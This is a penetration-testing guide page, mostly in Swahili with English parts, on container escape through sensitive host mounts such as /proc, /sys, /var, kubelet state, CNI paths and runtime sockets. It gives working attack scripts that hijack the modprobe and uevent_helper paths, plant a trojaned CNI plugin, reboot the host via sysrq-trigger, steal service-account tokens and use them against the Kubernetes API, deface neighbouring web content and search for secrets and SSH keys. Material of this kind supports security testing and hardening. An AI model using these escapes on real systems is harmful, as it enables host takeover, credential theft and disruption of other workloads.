# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts ni mojawapo ya muhimu zaidi kwa vitendo katika container-escape surfaces kwa sababu mara nyingi hugeuza mwonekano wa process uliotengwa kwa uangalifu kurudi kwenye direct visibility ya host resources. Hali hatari hazijumuishi `/` pekee. Bind mounts za `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, au device-related paths zinaweza kufichua kernel controls, credentials, neighboring container filesystems, na runtime management interfaces.

Ukurasa huu upo tofauti na kurasa binafsi za protection kwa sababu abuse model ni cross-cutting. Writable host mount ni hatari kwa sehemu kwa sababu ya mount namespaces, kwa sehemu kwa sababu ya user namespaces, kwa sehemu kwa sababu ya AppArmor au SELinux coverage, na kwa sehemu kwa sababu ya ni host path gani hasa ilifichuliwa. Kuichukulia kama mada yake yenyewe hufanya attack surface iwe rahisi sana kuielewa.

## `/proc` Exposure

procfs ina taarifa za kawaida za process pamoja na high-impact kernel control interfaces. Bind mount kama `-v /proc:/host/proc` au container view inayofichua unexpected writable proc entries inaweza hivyo kusababisha information disclosure, denial of service, au direct host code execution.

High-value procfs paths ni pamoja na:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Anza kwa kuangalia ni zipi high-value procfs entries zinazoonekana au zinaweza kuandikwa:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:

- `/proc/sys/kernel/core_pattern`
If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
- `/proc/sys/vm/panic_on_oom`
This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
- `/proc/config.gz`
Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
- `/proc/sysrq-trigger`
Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
- `/proc/kmsg`
Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
- `/proc/kallsyms`
Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
- `/proc/[pid]/mem`
This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
- `/proc/kcore`
Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
- `/proc/kmem` and `/proc/mem`
Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
- `/proc/sched_debug`
Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
- `/proc/[pid]/mountinfo`
Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Amri hizi zinafaa kwa sababu mbinu kadhaa za host-execution zinahitaji kubadili path iliyo ndani ya container kuwa path inayolingana kutoka mtazamo wa host.

### Full Example: `modprobe` Helper Path Abuse

Ikiwa `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka kwenye container na helper path inatafsiriwa katika host context, inaweza kuelekezwa upya kwenda payload inayodhibitiwa na mshambuliaji:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Kichocheo halisi kinategemea target na tabia ya kernel, lakini jambo muhimu ni kwamba njia ya helper inayoweza kuandikwa inaweza kuelekeza invocation ya baadaye ya kernel helper kwenda kwenye maudhui ya host-path yanayodhibitiwa na mshambuliaji.

### Mfano Kamili: Kernel Recon Kwa `kallsyms`, `kmsg`, Na `config.gz`

Kama lengo ni tathmini ya exploitability badala ya immediate escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Amri hizi husaidia kujibu kama taarifa muhimu za alama zinaonekana, kama ujumbe wa hivi karibuni wa kernel unafichua hali ya kuvutia, na ni vipengele au mitigations gani za kernel zimejengwa ndani. Athari kwa kawaida si escape ya moja kwa moja, lakini inaweza kufupisha sana kernel-vulnerability triage.

### Full Example: SysRq Host Reboot

Ikiwa `/proc/sysrq-trigger` inaweza kuandikwa na inafikia host view:
```bash
echo b > /proc/sysrq-trigger
```
Dhumuni ni reboot ya host mara moja. Huu si mfano wa hila, lakini unaonyesha wazi kwamba kufichuliwa kwa procfs kunaweza kuwa jambo zito zaidi kuliko information disclosure.

## `/sys` Exposure

sysfs hufichua kiasi kikubwa cha state ya kernel na device. Baadhi ya njia za sysfs husaidia zaidi kwa fingerprinting, ilhali zingine zinaweza kuathiri helper execution, device behavior, security-module configuration, au firmware state.

Njia za sysfs zenye thamani kubwa ni pamoja na:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Njia hizi ni muhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri thermal-management behavior na hivyo host stability katika mazingira yaliyofichuliwa vibaya. `/sys/kernel/vmcoreinfo` inaweza kuvuja crash-dump na kernel-layout information ambavyo husaidia kwa low-level host fingerprinting. `/sys/kernel/security` ni interface ya `securityfs` inayotumiwa na Linux Security Modules, hivyo access isiyotarajiwa hapo inaweza kufichua au kubadilisha MAC-related state. Njia za EFI variable zinaweza kuathiri firmware-backed boot settings, na kuzifanya kuwa zenye uzito zaidi kuliko ordinary configuration files. `debugfs` chini ya `/sys/kernel/debug` ni hatari hasa kwa sababu kwa makusudi ni developer-oriented interface yenye matarajio machache sana ya usalama kuliko hardened production-facing kernel APIs.

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Ni nini hufanya amri hizo ziwe za kuvutia:

- `/sys/kernel/security` inaweza kufichua kama AppArmor, SELinux, au LSM nyingine inaonekana kwa njia ambayo ilipaswa kubaki host-only.
- `/sys/kernel/debug` mara nyingi ndio ugunduzi wa kutisha zaidi katika kundi hili. Ikiwa `debugfs` ime-mountiwa na inaweza kusomwa au kuandikwa, tarajia surface pana inayokabili kernel ambayo hatari yake halisi inategemea debug nodes zilizo enabled.
- Kufichuliwa kwa EFI variable ni nadra zaidi, lakini ikipatikana ni high impact kwa sababu hugusa mipangilio inayotegemea firmware badala ya files za kawaida za runtime.
- `/sys/class/thermal` hasa ni muhimu kwa host stability na hardware interaction, si kwa neat shell-style escape.
- `/sys/kernel/vmcoreinfo` hasa ni chanzo cha host-fingerprinting na crash-analysis, muhimu kwa kuelewa low-level kernel state.

### Full Example: `uevent_helper`

Ikiwa `/sys/kernel/uevent_helper` inaweza kuandikwa, kernel inaweza ku-execute helper inayodhibitiwa na mshambulizi wakati `uevent` inapochochewa:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Sababu hii inafanya kazi ni kwamba helper path inatafsiriwa kutoka mtazamo wa host. Mara tu inapochochewa, helper huendeshwa katika host context badala ya ndani ya container ya sasa.

## `/var` Exposure

Mounting host's `/var` ndani ya container mara nyingi hudharauliwa kwa sababu haionekani ya kushangaza kama mounting `/`. Kwa vitendo, inaweza kuwa ya kutosha kufikia runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, na neighboring application filesystems. Kwenye nodes za kisasa, `/var` mara nyingi ndipo container state iliyo muhimu zaidi kiutendaji huishi kweli.

### Kubernetes Example

Pod yenye `hostPath: /var` mara nyingi inaweza kusoma projected tokens za pods nyingine na overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Amri hizi zinafaa kwa sababu zinajibu kama mount inaonyesha tu data ya kawaida ya programu au credentials za cluster zenye athari kubwa. service-account token inayoweza kusomwa inaweza mara moja kubadilisha local code execution kuwa Kubernetes API access.

Ikiwa token ipo, thibitisha inaweza kufikia nini badala ya kuishia tu kwenye token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Athari hapa inaweza kuwa kubwa zaidi kuliko local node access. Token yenye broad RBAC inaweza kugeuza `/var` iliyomountiwa kuwa cluster-wide compromise.

### Docker And containerd Example

Kwenye Docker hosts data muhimu mara nyingi iko chini ya `/var/lib/docker`, wakati kwenye containerd-backed Kubernetes nodes inaweza kuwa chini ya `/var/lib/containerd` au snapshotter-specific paths:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ikiwa iliyowekwa `/var` inaonyesha maudhui ya snapshot yanayoweza kuandikwa ya workload nyingine, mshambuliaji anaweza kubadilisha faili za application, kupanda web content, au kubadilisha startup scripts bila kugusa current container configuration.

Mawazo ya matumizi mabaya ya moja kwa moja mara tu maudhui ya snapshot yanayoweza kuandikwa yanapopatikana:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Amri hizi ni muhimu kwa sababu zinaonyesha familia tatu kuu za athari za mounts za `/var`: application tampering, secret recovery, na lateral movement kwenda kwenye workloads jirani.

## Kubelet State, Plugins, And CNI Paths

Mount ya `/var/lib/kubelet`, `/opt/cni/bin`, au `/etc/cni/net.d` mara nyingi huonekana kupitia privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, na storage helpers. Mounts hizi ni rahisi kupuuzwa kama "node plumbing", lakini ziko moja kwa moja katika execution path ya pods mpya na mara nyingi huwa na kubelet credentials, projected secrets, registration sockets, na executable host-side plugin binaries.

High-value targets ni pamoja na:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Kwa nini paths hizi ni muhimu:

- `/var/lib/kubelet/pki` inaweza kufichua kubelet client certificates na nyingine node-local credentials ambazo wakati mwingine zinaweza kutumika tena dhidi ya API server au kubelet-facing TLS endpoints, kutegemea design ya cluster.
- `/var/lib/kubelet/pods` mara nyingi huwa na projected service-account tokens na mounted Secrets za neighboring pods kwenye node ile ile.
- `/var/lib/kubelet/pod-resources/kubelet.sock` hasa ni reconnaissance surface, lakini yenye manufaa sana: inaonyesha ni pods na containers gani kwa sasa zinamiliki GPUs, hugepages, SR-IOV devices, na scarce node-local resources nyingine.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, na `/var/lib/kubelet/plugins_registry` zinaonyesha ni CSI, DRA, na device plugins zipi zimewekwa na sockets zipi kubelet inatarajiwa kuzungumza nazo. Ikiwa directories hizo zinaweza kuandikwa badala ya kusomwa tu, finding inakuwa serious zaidi sana.
- `/opt/cni/bin` na `/etc/cni/net.d` ziko moja kwa moja kwenye njia ya pod-network setup. Writable access hapo mara nyingi ni delayed host-execution primitive kuliko exposure ya configuration tu.

### Full Example: Writable `/opt/cni/bin`

If a host CNI binary directory is mounted read-write, replacing a plugin can be enough to obtain host execution the next time the kubelet creates a pod sandbox on that node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Hii si ya haraka kama `docker.sock` iliyowekwa, lakini mara nyingi ni halisi zaidi katika compromised Kubernetes infrastructure pods. Jambo muhimu ni kwamba binary iliyobadilishwa baadaye inaendeshwa na host network setup flow, si na current container.


## Runtime Sockets

Sensitive host mounts mara nyingi hujumuisha runtime sockets badala ya directories kamili. Hizi ni muhimu sana kiasi kwamba zinastahili kurudiwa wazi hapa:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Tazama [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa mtiririko kamili wa exploitation mara tu moja ya hizi sockets inapowekwa.

Kama muundo wa haraka wa mwingiliano wa kwanza:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
If one of these succeeds, njia kutoka kwa "mounted socket" hadi "start a more privileged sibling container" kwa kawaida ni fupi zaidi kuliko njia yoyote ya kernel breakout.

## Mount-Related CVEs

Host mounts pia huingiliana na runtime vulnerabilities. Mifano muhimu ya hivi karibuni ni pamoja na:

- `CVE-2024-21626` katika `runc`, ambapo leaked directory file descriptor inaweza kuweka working directory kwenye host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, na `CVE-2024-23653` katika BuildKit, ambapo malicious Dockerfiles, frontends, na `RUN --mount` flows zinaweza kureintroduce host file access, deletion, au elevated privileges during builds.
- `CVE-2024-1753` katika Buildah na Podman build flows, ambapo crafted bind mounts during build zinaweza kuweka `/` read-write.
- `CVE-2025-47290` katika `containerd` 2.1.0, ambapo TOCTOU wakati wa image unpack inaweza kuruhusu specially crafted image kubadilisha host filesystem during pull.

Hizi CVEs ni muhimu hapa kwa sababu zinaonyesha kwamba mount handling si tu kuhusu operator configuration. Runtime yenyewe pia inaweza kuleta mount-driven escape conditions.

## Checks

Tumia amri hizi ili kutambua haraka mount exposures zenye thamani ya juu zaidi:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Nini cha kuvutia hapa:

- Host root, `/proc`, `/sys`, `/var`, na runtime sockets zote ni matokeo ya kipaumbele cha juu.
- Writable proc/sys entries mara nyingi humaanisha mount inaonyesha host-global kernel controls badala ya safe container view.
- Mounted `/var` paths zinastahili credential na neighboring-workload review, sio filesystem review pekee.
- Kubelet state directories na CNI/plugin paths zinastahili kipaumbele sawa na runtime sockets kwa sababu mara nyingi hukaa moja kwa moja kwenye node's pod-creation na credential-distribution path.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
